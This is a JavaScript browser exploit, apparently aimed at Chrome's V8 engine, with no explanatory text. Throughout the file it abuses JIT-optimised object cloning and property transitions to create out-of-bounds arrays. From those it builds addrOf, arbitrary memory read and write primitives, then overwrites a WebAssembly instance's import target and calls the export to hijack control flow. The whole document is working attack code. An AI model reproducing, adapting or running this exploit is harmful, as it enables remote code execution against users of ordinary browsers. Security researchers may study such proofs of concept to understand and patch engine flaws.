const importObject = {
  imports: {
    imported_func(arg) {
      return arg;
    }

  }
};
var tag = new WebAssembly.Tag({
  parameters: ["i32", "i64"]
});
var simpleWasm = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 1, 127, 0, 96, 0, 0, 2, 25, 1, 7, 105, 109, 112, 111, 114, 116, 115, 13, 105, 109, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 0, 3, 2, 1, 1, 7, 17, 1, 13, 101, 120, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 1, 10, 8, 1, 6, 0, 65, 42, 16, 0, 11]);
var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Uint32Array(view);
var bigIntView = new BigInt64Array(view);

function ftoi32(f) {
  dblArr[0] = f;
  return [intView[0], intView[1]];
}

function i32tof(i1, i2) {
  intView[0] = i1;
  intView[1] = i2;
  return dblArr[0];
}

function itof(i) {
  bigIntView = BigInt(i);
  return dblArr[0];
}

function ftoi(f) {
  dblArr[0] = f;
  return bigIntView[0];
}

function addrOf(obj, dblOffset) {
  oobObjArr[0] = obj;

  if (dblOffset % 2 == 0) {
    var addrDbl = oobDblArr[dblOffset / 2];
    return ftoi32(addrDbl)[0] - 8;
  }

  var addrDbl = oobDblArr[(dblOffset - 1) / 2];
  return ftoi32(addrDbl)[1] - 8;
}

function read(addr, dblArrOffset) {
  var oldValue = oobDblArr[dblArrOffset];
  oobDblArr[dblArrOffset] = i32tof(addr, 8);
  var out = ftoi32(oobDblArr2[0]);
  oobDblArr[dblArrOffset] = oldValue;
  return out;
}

function write(addr, val1, val2, dblArrOffset) {
  var oldValue = oobDblArr[dblArrOffset];
  oobDblArr[dblArrOffset] = i32tof(addr, 8);
  oobDblArr2[0] = i32tof(val1, val2);
  oobDblArr[dblArrOffset] = oldValue;
  return;
}

function searchByteArray(byteArrayMap, start, length) {
  for (let thisAddr = start; thisAddr < start + length; thisAddr += 4) {
    var val = read(thisAddr, dblOffset);

    if (val[0] == byteArrayMap) {
      return thisAddr + 8;
    }
  }
}

function clone0(x) {
  return { ...x
  };
}

function set_length(x) {
  x.c4.len = 1000;
}

var obj0 = {
  c0: 0,
  c1: 1,
  c2: 2,
  c3: 3
};
obj0.c4 = {
  len: 1
};
var obj1 = {
  c0: 0,
  c1: 1,
  c2: 2,
  c3: 3
};
obj1.c4 = {
  len: 1
};

for (let i = 0; i < 20; i++) {
  clone0(obj0);
}

set_length(obj1);

for (let i = 0; i < 20000; i++) {
  set_length(obj0);
}

var a8 = {
  c: 1
};
var a7 = clone0(obj0);

function transition_store(x) {
  x.a7 = 0x100;
} //PropertyArray


function transition_store2(x) {
  x.a8 = a8;
}

function clone(x) {
  return { ...x
  };
}

var x = WebAssembly.Tag.prototype;
x.type = {};
x.a1 = 1;
delete x.constructor;
delete x[Symbol.toStringTag];
x.a2 = 1;
x.a3 = 1;
x.a4 = 1;
x.a5 = 1;
x.a6 = 1;
var y = {};
y.__proto__ = x;
meta = document.createElement('meta');
meta.httpEquiv = 'Origin-Trial';
meta.content = '{"origin" : "http://localhost:8000", "feature": "WebAssemblyJSPromiseIntegration", "expiry": 1719702000}';
document.head.appendChild(meta);
y.a = 1;
z = y.a;
var obj = { ...x
};
obj.type = 1;

for (let i = 1; i < 7; i++) {
  obj['a' + i] = {
    a: 1
  };
}

for (let i = 0; i < 20; i++) {
  obj = clone(x);
}

obj.x = 1;
var obj2 = { ...obj
};
var obj3 = { ...obj
};
var val = {
  c: 1
};
transition_store(obj3);
transition_store2(obj3);

for (let i = 0; i < 20000; i++) {
  var tmp = { ...obj2
  };
  transition_store(tmp);
  transition_store2(tmp);
}

obj = clone(x);
obj.x = 1;
transition_store(obj);
transition_store2(obj);
var oobDblArr = [1.1];
var oobObjArr = [view, 0x42, 0x43];
oobObjArr[0] = 0x41;
var oobDblArr2 = [1, 1.5, 2, 2.5];

for (let i = 9; i < 15; i++) {
  obj['a' + i] = oobDblArr;
}

set_length(a7);
var dblOffset = null;

for (let i = 0; i < 20; i++) {
  var elem = ftoi32(oobDblArr[i]);

  if (elem[0] == 6 && elem[1] == 2 * 0x41) {
    let next = ftoi32(oobDblArr[i + 1]);

    if (next[0] == 2 * 0x42 && next[1] == 2 * 0x43) {
      dblOffset = 2 * i + 1;
    }
  } else if (elem[1] == 6) {
    let next = ftoi32(oobDblArr[i + 1]);

    if (next[0] == 2 * 0x41 && next[1] == 2 * 0x42) {
      dblOffset = 2 * (i + 1);
    }
  }
}

var oobObjAddr = addrOf(oobObjArr, dblOffset);
var oobDblAddr = addrOf(oobDblArr, dblOffset);
var oobDblAddr2 = addrOf(oobDblArr2, dblOffset);
var dblIndexOffset = Math.floor((oobDblAddr2 - oobDblAddr - 0x18) / 8);
var tagAddr = addrOf(tag, dblOffset);
var byteArray = read(tagAddr + 12, dblIndexOffset)[0];
var byteArrayMap = read(byteArray - 8, dblIndexOffset)[0];
var module = new WebAssembly.Module(simpleWasm);
var tmpObj = {};
var instance = new WebAssembly.Instance(module, importObject);
var moduleAddr = addrOf(tmpObj, dblOffset);
var importTargets = searchByteArray(byteArrayMap, moduleAddr + 200, 40);
var instr_start = read(importTargets, dblIndexOffset);
var msg = 'importTargets: 0x' + importTargets.toString(16) + ' instr_start: 0x' + instr_start[1].toString(16) + instr_start[0].toString(16);
alert(msg);
write(importTargets, 0x41414141, 0x4141, dblIndexOffset);
var exported = instance.exports.exported_func;
exported();
exported();